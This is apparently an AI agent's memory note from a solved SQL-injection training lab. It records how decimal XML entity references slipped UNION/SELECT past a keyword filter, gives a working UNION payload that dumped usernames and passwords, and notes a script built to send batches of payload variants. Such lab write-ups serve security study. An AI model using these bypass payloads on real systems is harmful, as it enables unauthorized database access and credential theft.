---
metadata:
  node_type: memory
name: "XML entity WAF bypass SQLi"
description: "Decimal XML entity refs bypass raw-byte keyword WAFs; hex refs 400. Unquoted stock-check injection needs \"-1 UNION SELECT ...-- \"."
last_updated: 2026-10-11T00:20:36+08:00
created: 2026-10-11T00:20:36+08:00
---

Lab: /web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding (solved).

Shape: stock check endpoint POST /product/stock takes an XML body
`<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>..</productId><storeId>1</storeId></stockCheck>`.
A front filter returns 403 {"Attack detected"} on the raw bytes of UNION / SELECT.

Findings (measured):
- DECIMAL numeric character references beat the filter: `1 &#85;NION &#83;ELECT ...` -> 200. The filter matches raw bytes only; the XML parser decodes afterwards, so the SQL sees the plaintext keyword.
- HEX references fail here: `&#x55;NION` -> 400 "XML parsing error". Prefer decimal `&#NN;`.
- The filter does NOT decode entities, so partial encoding suffices; full encoding also passes.
- Injection context is unquoted and the query ends at productId: a quote-breakout payload (`1' UNION SELECT ...-- `) returns 0 rows. Working dump shape is `-1 UNION SELECT username||'~'||password FROM users-- ` (leading non-matching row so the UNION rows are what get rendered). `1 UNION SELECT ...` alone renders "0 units" even though the union runs.
- Response is plain text, 90 bytes for 3 credentials. Retrieved administrator / zl7elovi8drvuofkuul1.

Piece created: .pi-rs/rust-scripts/xml_enc.rs (v1.1.0) - decimal/hex entity encoder; `--body` assembles the stockCheck XML; `--matrix FILE --host H --payload 'SQL'...` emits a raw_matrix spec with per-variant Content-Length so a whole probe battery goes in one envelope.

Verdict anchor: banner_verdict on the base URL -> solved:true, "Congratulations, you solved the lab!".
